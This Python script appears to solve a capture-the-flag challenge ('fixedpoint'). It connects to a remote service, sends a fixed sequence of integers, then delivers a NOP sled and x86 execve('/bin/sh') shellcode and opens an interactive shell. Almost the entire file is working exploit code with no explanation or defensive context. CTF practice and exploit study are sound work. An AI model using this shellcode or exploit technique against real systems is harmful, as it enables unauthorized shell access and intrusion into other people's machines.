#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import time
import re

host = "fixedpoint.pwning.xxx"
port = 7777
#host = "10.211.55.23"
#port = 8888


sock = make_conn(host,port)


s = [902261832,902810670,902634687,952964214,956996606,952964131,955640554]
sc = "\x90"*0x90+ "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

for i in s :
    time.sleep(0.2)
    sendline(sock,str(i))
    
time.sleep(0.2)
sendline(sock,"-")
time.sleep(0.2)
sendline(sock,sc)
inter(sock)
